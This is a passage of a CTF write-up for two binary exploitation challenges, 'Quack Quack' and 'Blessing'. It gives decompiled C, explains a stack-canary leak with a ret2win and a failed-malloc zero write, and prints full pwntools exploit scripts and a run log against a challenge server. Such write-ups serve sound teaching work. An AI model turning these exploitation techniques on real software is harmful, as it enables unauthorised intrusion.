</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    RUNPATH:    b<span style="color:#e6db74">&#39;./glibc/&#39;</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><p>More importantly, we notice binary isn&rsquo;t PIE (meaning we can pre-calculate adresses of the binary functions, data, etc&hellip;)</p>
<h3 id="analysis-1">Analysis<a href="#analysis-1" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>By looking at the <code>main()</code>, it simply calls the <code>duckling()</code> function which holds all the program logic. The program allocates a stack buffer <code>buf</code> of <code>110</code> bytes.
It then reads a first user input into it and checks if it holds the string <code>&quot;Quack Quack&quot;</code> and exists otherwise. After that it prints a string at the location <code>v1+32</code> (where <code>v1</code> points to the <code>Quack Quack</code> occurence in the stack buffer. Finally, it reads 106 characters from <code>buf+32</code> but as the buffer is only <code>110</code> bytes large, this overflow the buffer by <code>28</code> bytes, writting beyond its limit and overflowing next variables (canary and returna ddress most importantly).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">duckling</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// [rsp+8h] [rbp-88h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">110</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-80h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> canary; <span style="color:#75715e">// [rsp+88h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Quack the Duck!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(_bss_start);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">102uLL</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34;Quack Quack &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v1 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Where are your Quack Manners?!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1312</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Quack Quack %s, ready to fight the Duck?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#34;</span>, v1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">32</span>], <span style="color:#ae81ff">106uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Did you really expect to win a fight against a Duck?!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> canary <span style="color:#f92672">-</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we have a buffer overflow which could allow us redirect the program control flow, but the stack cookies (canary) forbid us from doing so by placing random values onto the stack at runtime. this means that if we are
not able to retrieve the random value and place it at the right location during the overflow, the program will abort and exploitation would fail.</p>
<h3 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Looking at the stack frame layout of <code>duckling()</code>, we see that the canary is <code>120</code> bytes far from the buffer start address. This means that using the pointer dereference from the <code>Quack Quack</code> string in the buffer printing part could allow us reading this canary value (because <code>102 + 32 &gt; 120</code>). By carefully placing the <code>Quack Quack</code> string in our input, we can make sure to leak the canary value in the <code>printf()</code> call.</p>
<p>So this allows us to bypass the canary and place an address into the stack frame return address location, so that we divert control flow. But we should find something to call first. In the program, there is a <code>duck_attack()</code> function which reads and print out the flag. We will juste perform a <code>ret2win</code> to retrieve the flag !</p>
<p>Using the following exploit script, we leak the canary and exploit the buffer overflow to call the later function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-b&#39;</span>, <span style="color:#e6db74">&#39;--binary&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local binary path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    win_ea <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>duck_attack
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    off_to_canary_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">88</span><span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    off_to_canary_2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">88</span>
</span></span><span style="display:flex;"><span>    should_land_ptr <span style="color:#f92672">=</span> off_to_canary_1<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>should_land_ptr
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack Quack &#34;</span>
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>    print(len(payload), payload)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack the Duck!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Quack Quack &#39;</span>)
</span></span><span style="display:flex;"><span>    leak_str <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;, ready&#39;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>(off_to_canary_1<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack Quack &#34;</span>)), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)[:<span style="color:#ae81ff">7</span>]
</span></span><span style="display:flex;"><span>    print(leak_str)
</span></span><span style="display:flex;"><span>    canary_leak <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> leak_str)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] canary = &#39;</span>, hex(canary_leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>off_to_canary_2
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(canary_leak)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(win_ea)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive() <span style="color:#75715e"># will print flag</span>
</span></span></code></pre></div><p>Running the script gives us the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 exploit.py -b ./quack_quack remote 94.237.57.171 <span style="color:#ae81ff">43784</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 94.237.57.171 on port 43784: Done
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    RUNPATH:    b<span style="color:#e6db74">&#39;./glibc/&#39;</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">101</span> b<span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;T\xbd\x08\xa4\x92O)&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> canary <span style="color:#f92672">=</span>  0x294f92a408bd5400
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; Did you really expect to win a fight against a Duck?!
</span></span><span style="display:flex;"><span>https://yocvito.github.io/posts/ctf-htb-cyberapocalypse-2025/
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>XXX<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="pwn---blessing">PWN - Blessing<a href="#pwn---blessing" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="enumeration-1">Enumeration<a href="#enumeration-1" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Binary is dynamically linked and not stripped. It has following security mechanisms enabled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec blessing
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        PIE enabled
</span></span><span style="display:flex;"><span>    RUNPATH:    b<span style="color:#e6db74">&#39;./glibc/&#39;</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><h3 id="analysis-2">Analysis<a href="#analysis-2" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>We open the binary in IDA. We see that the <code>main()</code> function allocates a big buffer on the heap (which is actually mmaped instead of being located on heap), and writes a boolean flag at this location. If this flag is
<strong>false (0)</strong> at the end of the program, then it displays the flag.</p>
<p>Moreover, the program reads a <strong>size</strong> as well as a <strong>buffer</strong> of the respecting length from user input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> size; <span style="color:#75715e">// [rsp+8h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+10h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf; <span style="color:#75715e">// [rsp+20h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">banner</span>();
</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x30000uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printstr</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Please accept this: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%p&#34;</span>, v6);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xD</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">0xEA60u</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;%s[%sBard%s]: Now, I want something in return...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">How about a song?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Give me the song&#39;s length: &#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;32m&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>size);
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(size);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s[%sBard%s]: Excellent! Now tell me the song: &#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;32m&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, size);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf[size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, buf, size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>v6 )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s[%sBard%s]: Your song was not as good as expected...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;32m&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_flag</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As PIE (and likely ASLR) are enabled, the program gives us a memory leak (the address of the boolean flag) so that we can attack the program
without having to cause a leak by ourself. So now, we need to think of a way to modify the boolean flag value to set it to <strong>0</strong>.</p>
<h3 id="exploitation-1">Exploitation<a href="#exploitation-1" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>We can notice that if the <code>malloc()</code> used to allocated our input fails, then the program would write a zero value (8 bytes) at the <code>size</code> location (because <code>*&amp;0[size-1] &lt;=&gt; *(size-1)</code>).
So if we can make sure the malloc call fail as we supplly <code>@bool_flag-1</code> as a size, and to not write bytes at the <code>buf</code> location in the following <code>read()</code>, then the program would overwrite
the boolean flag value with 0, allowing us to print the flag.</p>
<p>We write the following exploit script to do so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_local<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;binary&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;accept this: &#39;</span>)
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    print(leak)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;length: &#39;</span>))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(leak)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;me the song: &#39;</span>))
</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
</span></span><span style="display:flex;"><span>    print(flag)
</span></span></code></pre></div><p>Running the script gives us the flag:</p>
